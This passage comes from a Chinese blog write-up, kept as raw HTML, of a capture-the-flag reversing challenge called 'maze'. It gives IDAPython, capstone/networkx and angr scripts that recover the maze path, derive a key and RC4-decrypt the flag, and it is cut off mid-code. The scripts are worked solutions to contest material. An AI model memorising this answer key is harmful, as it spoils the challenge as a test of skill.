class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idaapi<br><br>function_address = <span class="hljs-number">0x1500</span><br>function = idaapi.get_func(function_address) <span class="hljs-comment"># 由给定的函数地址获取函数对象</span><br>graph = <span class="hljs-built_in">dict</span>() <span class="hljs-comment"># 创建一个空的字典，用于存储函数的控制流程图，用于之后存储基本快之间的连接关系</span><br>cfg = idaapi.FlowChart(function) <span class="hljs-comment"># 接受一个函数对象作为参数，并返回一个表示控制流程图的对象，该对象包含函数的基本块和它们之间的控制流转移关系</span><br>exclusive_nodes = <span class="hljs-built_in">list</span>()<span class="hljs-comment"># 空列表，用于存储跳转目标地址小于等于5的节点，这些节点可能是特殊的或特定情况下的跳转块</span><br>first = <span class="hljs-literal">None</span><br>jmp_dict = <span class="hljs-built_in">dict</span>() <span class="hljs-comment"># 空字典，用于存储跳转指令的信息。在后续的分析过程中，可能会将跳转指令的类型和目标地址存储在这个字典中</span><br><br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> cfg: <span class="hljs-comment"># 遍历所有的基本块</span><br>    graph[block.start_ea] = <span class="hljs-built_in">list</span>() <span class="hljs-comment"># 为每个基本块的起始地址创建一个空的列表，用于存储与之相连的后继节点---&gt;&#123;&#x27;0x1500&#x27;: [], &#x27;0x1501&#x27;: []…………&#125;</span><br>    start_address = block.start_ea<br>    end_address = block.end_ea<br>    <span class="hljs-keyword">if</span> first <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting&quot;</span>)<br>        first = start_address<br>    <br>    <span class="hljs-keyword">if</span> end_address - start_address &lt;= <span class="hljs-number">5</span>: <span class="hljs-comment"># 这里专门找jnz jmp类型的程序，获取其中只有 jmp 的基本块</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;found jmp block&quot;</span>)<br>        exclusive_nodes.append(start_address) <span class="hljs-comment"># 存储跳转目标地址小于等于5的节点 </span><br>        <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> block.succs():  <span class="hljs-comment">#遍历当前基本块的后继节点。通过这个循环，可以获取基本块之间的连接关系，并将其存储在graph字典中</span><br>            graph[block.start_ea].append(succ.start_ea)<br>        <span class="hljs-keyword">continue</span><br>        <br>    ea = <span class="hljs-number">0</span>   <span class="hljs-comment"># 迭代计算指令地址</span><br>    flag = <span class="hljs-number">0</span> <span class="hljs-comment"># 记录跳转指令类型</span><br>    tgt = <span class="hljs-number">0</span>  <span class="hljs-comment"># 记录跳转目标地址</span><br>    <span class="hljs-keyword">while</span> (end_address - ea) != start_address: <span class="hljs-comment"># 循环直到迭代到当前基本块的起始地址</span><br>        <span class="hljs-keyword">if</span> idc.GetDisasm(end_address - ea).startswith(<span class="hljs-string">&quot;jnz&quot;</span>):<span class="hljs-comment"># 检查当前指令是否以&quot;jnz&quot;开头</span><br>            <span class="hljs-comment"># print(int(idc.GetDisasm(end_address - ea)[-4::],16))</span><br>            flag = <span class="hljs-number">1</span> <span class="hljs-comment"># 设置flag为1，表示跳转指令为&quot;jnz&quot;</span><br>            tgt = <span class="hljs-built_in">int</span>(idc.GetDisasm(end_address - ea)[-<span class="hljs-number">4</span>::],<span class="hljs-number">16</span>) <span class="hljs-comment"># 将跳转目标地址解析为十六进制整数并赋值给tgt</span><br>        <span class="hljs-keyword">elif</span> idc.GetDisasm(end_address - ea).startswith(<span class="hljs-string">&quot;jz&quot;</span>):<br>            flag = <span class="hljs-number">2</span><br>            tgt = <span class="hljs-built_in">int</span>(idc.GetDisasm(end_address - ea)[-<span class="hljs-number">4</span>::], <span class="hljs-number">16</span>)<br>        ea += <span class="hljs-number">1</span> <span class="hljs-comment"># 迭代下一个指令</span><br>    <span class="hljs-keyword">if</span> flag != <span class="hljs-number">0</span>: <span class="hljs-comment"># 检查flag是否不为0，即是否存在跳转指令</span><br>        jmp_dict[block.start_ea] = (flag,tgt) <span class="hljs-comment"># 将跳转指令的信息添加到jmp_dict字典中，即表明了跳转类型与跳转地址</span><br>    <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> block.succs():<br>        graph[block.start_ea].append(succ.start_ea) <span class="hljs-comment"># 将当前基本块的起始地址与后继节点的起始地址连接起来</span><br><br><span class="hljs-built_in">print</span>(jmp_dict)<br></code></pre></td></tr></table></figure><ul><li>之后使用 <code>DFS</code> 来计算路径，将这两部分代码合在一起执行IDAPython语句即可得到最后路径</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">BFS</span>(<span class="hljs-params">grap, star</span>):                    <span class="hljs-comment"># BFS算法</span><br>    queue = []                          <span class="hljs-comment"># 定义一个队列</span><br>    seen = <span class="hljs-built_in">set</span>()                        <span class="hljs-comment"># 建立一个集合，集合就是用来判断该元素是不是已经出现过</span><br>    queue.append(star)                  <span class="hljs-comment"># 将任一个节点放入</span><br>    seen.add(star)                      <span class="hljs-comment"># 同上</span><br>    parent = &#123;star:<span class="hljs-literal">None</span>&#125;                <span class="hljs-comment"># 存放parent元素</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">len</span>(queue) &gt; <span class="hljs-number">0</span>):             <span class="hljs-comment"># 当队列里还有东西时</span><br>        ver = queue.pop(<span class="hljs-number">0</span>)              <span class="hljs-comment"># 取出队头元素</span><br>        notes = grap[ver]               <span class="hljs-comment"># 查看grep里面的key,对应的邻接点</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> notes:                 <span class="hljs-comment"># 遍历邻接点</span><br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen:           <span class="hljs-comment"># 如果该邻接点还没出现过</span><br>                queue.append(i)         <span class="hljs-comment"># 存入queue</span><br>                seen.add(i)             <span class="hljs-comment"># 存入集合</span><br>                parent[i] = ver         <span class="hljs-comment">#将元素对应的parent元素存入字典中</span><br>    <span class="hljs-keyword">return</span> parent<br><br><span class="hljs-comment"># path = bfs(graph, first, end)</span><br>parent = BFS(graph,first)<br><br>a = end<br>p=[]<br><span class="hljs-keyword">while</span> a != <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># print(a)</span><br>    p.append(a)<br>    a = parent[a]<br>path = p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;路径: <span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(path) - <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> path[i] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> exclusive_nodes <span class="hljs-keyword">and</span> path[i] != <span class="hljs-number">5376</span>:<br>        <span class="hljs-built_in">next</span> = path[i + <span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> (jmp_dict[path[i]][<span class="hljs-number">1</span>] == <span class="hljs-built_in">next</span> <span class="hljs-keyword">and</span> jmp_dict[path[i]][<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1&#x27;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-keyword">elif</span> (jmp_dict[path[i]][<span class="hljs-number">1</span>] != <span class="hljs-built_in">next</span> <span class="hljs-keyword">and</span> jmp_dict[path[i]][<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (jmp_dict[path[i]][<span class="hljs-number">1</span>] == <span class="hljs-built_in">next</span> <span class="hljs-keyword">and</span> jmp_dict[path[i]][<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (jmp_dict[path[i]][<span class="hljs-number">1</span>] != <span class="hljs-built_in">next</span> <span class="hljs-keyword">and</span> jmp_dict[path[i]][<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERR&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="法2"><a class="markdownIt-Anchor" href="#法2"></a> 法2</h3><p>从汇编代码中抽象出控制流块的前后关系，然后用最短路径算法求解。这里由于<code>maze_walk</code>中的指令比较单一，直接用capstone反汇编引擎恢复控制流：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.construct <span class="hljs-keyword">import</span> Container<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> Cs, CS_ARCH_X86, CS_MODE_64<br><span class="hljs-keyword">from</span> networkx <span class="hljs-keyword">import</span> DiGraph, shortest_path<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><br><span class="hljs-comment"># 从符号获取字节数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getdata</span>(<span class="hljs-params">elf: ELFFile, entry: Container</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    addr, size = entry.st_value, entry.st_size<br>    <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> elf.iter_sections():<br>        start = section.header.sh_addr<br>        end = start + section.header.sh_size<br>        <span class="hljs-keyword">if</span> start &lt;= addr &lt;= end:<br>            <span class="hljs-keyword">assert</span> addr + size &lt;= end<br>            <span class="hljs-keyword">return</span> section.data()[addr-start:addr-start+size]<br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;cannot find data from 0x%x to 0x%x&#x27;</span> % (addr, addr + size))<br><br>elf = ELFFile(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;maze&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>))<br>symtab = elf.get_section_by_name(<span class="hljs-string">&#x27;.symtab&#x27;</span>)<br><br><span class="hljs-comment"># 获取函数的偏移和数据</span><br>maze_walk = symtab.get_symbol_by_name(<span class="hljs-string">&#x27;maze_walk&#x27;</span>)[<span class="hljs-number">0</span>].entry<br>code = getdata(elf, maze_walk)<br>maze_walk_addr = maze_walk.st_value<br>maze_step_addr = symtab.get_symbol_by_name(<span class="hljs-string">&#x27;maze_step&#x27;</span>)[<span class="hljs-number">0</span>].entry.st_value<br>maze_final_addr = symtab.get_symbol_by_name(<span class="hljs-string">&#x27;maze_final&#x27;</span>)[<span class="hljs-number">0</span>].entry.st_value<br><br><span class="hljs-comment"># 获取加密的flag数据</span><br>flag_enc = getdata(elf, symtab.get_symbol_by_name(<span class="hljs-string">&#x27;maze_flag&#x27;</span>)[<span class="hljs-number">0</span>].entry)<br>flag_enc = flag_enc[:-<span class="hljs-number">1</span>] <span class="hljs-comment"># 最后一个字节为结束字符</span><br><br><span class="hljs-comment"># 使用capstone将字节数据转换为汇编</span><br>cs = Cs(CS_ARCH_X86, CS_MODE_64)<br><br><span class="hljs-comment"># 把控制流块提取出来</span><br>blocks, current = [], <span class="hljs-literal">None</span><br>final_block_addr = <span class="hljs-literal">None</span> <span class="hljs-comment"># 最终块的地址</span><br><span class="hljs-keyword">for</span> addr, _, op, opr <span class="hljs-keyword">in</span> cs.disasm_lite(code, maze_walk_addr):<br>    <span class="hljs-comment"># insn = op + (&#x27; &#x27; + opr if opr else &#x27;&#x27;)</span><br>    <span class="hljs-comment"># print(&#x27;%04x %s&#x27; % (addr, insn))</span><br><br>    <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;nop&#x27;</span>: <span class="hljs-keyword">continue</span> <span class="hljs-comment"># 存在nop是因为指令对齐，过滤即可</span><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-comment"># 可能调用maze_step和maze_final</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(opr, <span class="hljs-number">0</span>) == maze_step_addr:<br>            current = []<br>            blocks.append(current)<br>            current.append((addr, op, opr))<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(opr, <span class="hljs-number">0</span>) == maze_final_addr:<br>            final_block_addr = addr<br>        <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;unknown function %s&#x27;</span> % opr)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> current <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>: <span class="hljs-comment"># 其他指令直接插入当前块</span><br>            current.append((addr, op, opr))<br><br><span class="hljs-comment"># patterns = set() # 先统计基本块模式的种类</span><br><span class="hljs-comment"># for block in blocks:</span><br><span class="hljs-comment">#     pattern = &#x27; &#x27;.join(op for _, op, _ in block)</span><br><span class="hljs-comment">#     patterns.add(pattern)</span><br><span class="hljs-comment">#     for addr, op, opr in block:</span><br><span class="hljs-comment">#         if opr: op += &#x27; &#x27; + opr</span><br><span class="hljs-comment">#         print(&#x27;%04x %s&#x27; % (addr, op))</span><br><span class="hljs-comment">#     print()</span><br><span class="hljs-comment"># print(patterns) # &gt; &#123;&#x27;call test je&#x27;, &#x27;call test jne&#x27;, &#x27;call test jne jmp&#x27;, &#x27;call test je jmp&#x27;&#125;</span><br><br>graph = [] <span class="hljs-comment"># 地址，0分支，1分支</span><br>blocks.append((final_block_addr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><span class="hljs-keyword">for</span> i, block <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(blocks[:-<span class="hljs-number">1</span>]):<br>    pattern = <span class="hljs-string">&#x27; &#x27;</span>.join(op <span class="hljs-keyword">for</span> _, op, _ <span class="hljs-keyword">in</span> block)<br>    <span class="hljs-keyword">if</span> pattern == <span class="hljs-string">&#x27;call test je&#x27;</span>:<br>        graph.append((block[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(block[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>], <span class="hljs-number">0</span>), blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]))<br>    <span class="hljs-keyword">elif</span> pattern == <span class="hljs-string">&#x27;call test jne&#x27;</span>:<br>        graph.append((block[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(block[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>], <span class="hljs-number">0</span>)))<br>    <span class="hljs-keyword">elif</span> pattern == <span class="hljs-string">&#x27;call test jne jmp&#x27;</span>:<br>        graph.append((block[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(block[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>], <span class="hljs-number">0</span>), <span class="hljs-built_in">int</span>(block[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>], <span class="hljs-number">0</span>)))<br>    <span class="hljs-keyword">elif</span> pattern == <span class="hljs-string">&#x27;call test je jmp&#x27;</span>:<br>        graph.append((block[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(block[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>], <span class="hljs-number">0</span>), <span class="hljs-built_in">int</span>(block[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>], <span class="hljs-number">0</span>)))<br>    <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;unknown pattern %r&#x27;</span> % pattern)<br><br><span class="hljs-comment"># 转换成有向图</span><br>addr2idx = &#123;node[<span class="hljs-number">0</span>]: i <span class="hljs-keyword">for</span> i, node <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(graph)&#125;<br>addr2idx[final_block_addr] = <span class="hljs-built_in">len</span>(addr2idx) <span class="hljs-comment"># 最终块</span><br>graph = <span class="hljs-built_in">list</span>((addr2idx[node[<span class="hljs-number">1</span>]], addr2idx[node[<span class="hljs-number">2</span>]]) <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> graph)<br><span class="hljs-comment"># -&gt; [(1, 5), (8, 2), (11, 3), ...]</span><br><br><span class="hljs-comment"># 求最短路径可以直接调库</span><br>G = DiGraph()<br><span class="hljs-keyword">for</span> i, node <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(graph):<br>    G.add_edge(i, node[<span class="hljs-number">0</span>])<br>    G.add_edge(i, node[<span class="hljs-number">1</span>])<br>path = shortest_path(G, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(graph))<br><br>key, current = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(path) == <span class="hljs-number">65</span><br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(path[<span class="hljs-number">1</span>:]):<br>    key |= graph[current].index(v) &lt;&lt; i<br>    current = v<br>key = key.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;miniLctf&#123;%s&#125;&#x27;</span> % ARC4.new(key).decrypt(flag_enc).decode())<br></code></pre></td></tr></table></figure><h3 id="法3"><a class="markdownIt-Anchor" href="#法3"></a> 法3</h3><p>注意到程序控制流复杂但逻辑简单，而且没有太多层函数调用，我们可以利用<a href="https://github.com/angr/angr">angr</a>符号执行框架来进行求解(为了避免路径爆炸，实现了一个自定义的<code>ExplorationTechnique</code>)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span><br><span class="hljs-keyword">from</span> angr <span class="hljs-keyword">import</span> Project, SimState, SimulationManager, ExplorationTechnique<br><span class="hljs-keyword">from</span> angr.sim_options <span class="hljs-keyword">import</span> ZERO_FILL_UNCONSTRAINED_REGISTERS<br><span class="hljs-keyword">from</span> cle.backends.symbol <span class="hljs-keyword">import</span> Symbol<br><span class="hljs-keyword">from</span> claripy <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MazeWalker</span>(<span class="hljs-title class_ inherited__">ExplorationTechnique</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;遍历方法：跳过已访问的代码，类似于BFS&#x27;&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, maze_range: <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>], nstep_addr: <span class="hljs-built_in">int</span>, final_addr: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self._<span class="hljs-built_in">range</span> = maze_range<br>        self._nstep_addr = nstep_addr<br>        self._final_addr = final_addr<br>        self._depth: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>] = &#123;&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">self, simgr: SimulationManager</span>) -&gt; <span class="hljs-literal">None</span>:<br>        simgr.stashes[<span class="hljs-string">&#x27;visited&#x27;</span>] = []<br>        simgr.stashes[<span class="hljs-string">&#x27;found&#x27;</span>] = []<br>        self._depth[simgr.active[<span class="hljs-number">0</span>].addr] = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">current_pos</span>(<span class="hljs-params">self, state: SimState</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-string">&#x27;&#x27;&#x27;返回`current`变量的值&#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> state.solver.<span class="hljs-built_in">eval</span>(state.mem[self._nstep_addr].unsigned.resolved, cast_to=<span class="hljs-built_in">int</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inside_maze</span>(<span class="hljs-params">self, state: SimState</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-string">&#x27;&#x27;&#x27;是否在`maze_walk`函数中&#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> self._<span class="hljs-built_in">range</span>[<span class="hljs-number">0</span>] &lt;= state.addr &lt; self._<span class="hljs-built_in">range</span>[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self, simgr: SimulationManager, stash: <span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;active&#x27;</span>, **kwargs: <span class="hljs-type">Any</span></span>) -&gt; SimulationManager:<br>        <span class="hljs-string">&#x27;&#x27;&#x27;在`step`方法中作额外的处理&#x27;&#x27;&#x27;</span><br>        simgr.step(stash=stash, **kwargs)<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">state_spiltter</span>(<span class="hljs-params">states: <span class="hljs-built_in">list</span>[SimState]</span>) -&gt; <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">list</span>[SimState], <span class="hljs-built_in">list</span>[SimState]]:<br>            keep, split = [], []<br>            <span class="hljs-keyword">for</span> state <span class="hljs-keyword">in</span> states:<br>                <span class="hljs-keyword">if</span> self.inside_maze(state): <span class="hljs-comment"># 只处理函数内部</span><br>                    addr = state.addr<br>                    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">isinstance</span>(addr, <span class="hljs-built_in">int</span>)<br>                    current = self.current_pos(state)<br>                    <span class="hljs-keyword">if</span> addr <span class="hljs-keyword">in</span> self._depth <span class="hljs-keyword">and</span> self._depth[addr] &lt; current:<br>                        split.append(state) <span class="hljs-comment"># 丢弃已经访问过的部分</span><br>                    <span class="hljs-keyword">else</span>:<br>                        self._depth[addr] = current<br>                        keep.append(state)<br>                <span class="hljs-keyword">else</span>:<br>                    keep.append(state)<br>            <span class="hljs-keyword">return</span> keep, split<br>        simgr.split(state_spiltter, from_stash=<span class="hljs-string">&#x27;active&#x27;</span>, to_stash=<span class="hljs-string">&#x27;visited&#x27;</span>)<br>        simgr.move(<span class="hljs-string">&#x27;active&#x27;</span>, <span class="hljs-string">&#x27;found&#x27;</span>, <span class="hljs-keyword">lambda</span> state: state.addr == self._final_addr)<br>        <span class="hljs-keyword">return</span> simgr<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">complete</span>(<span class="hljs-params">self, simgr: SimulationManager</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(simgr.found)<br><br>proj = Project(<span class="hljs-string">&#x27;maze&#x27;</span>, auto_load_libs=<span class="hljs-literal">False</span>, main_opts=&#123;<span class="hljs-string">&#x27;base_addr&#x27;</span>: <span class="hljs-number">0</span>&#125;)<br>key: Symbol = proj.loader.find_symbol(<span class="hljs-string">&#x27;key&#x27;</span>)<br>steps: Symbol = proj.loader.find_symbol(<span class="hljs-string">&#x27;steps&#x27;</span>)<br>current: Symbol = proj.loader.find_symbol(<span class="hljs-string">&#x27;current&#x27;</span>)<br>maze_walk: Symbol = proj.loader.find_symbol(<span class="hljs-string">&#x27;maze_walk&#x27;</span>)<br>maze_final: Symbol = proj.loader.find_symbol(<span class="hljs-string">&#x27;maze_final&#x27;</span>)<br><br>state: SimState = proj.factory.call_state(maze_walk.rebased_addr, prototype=<span class="hljs-string">&#x27;void f()&#x27;</span>)<br>state.options.add(ZERO_FILL_UNCONSTRAINED_REGISTERS)<br>key_value = BVS(<span 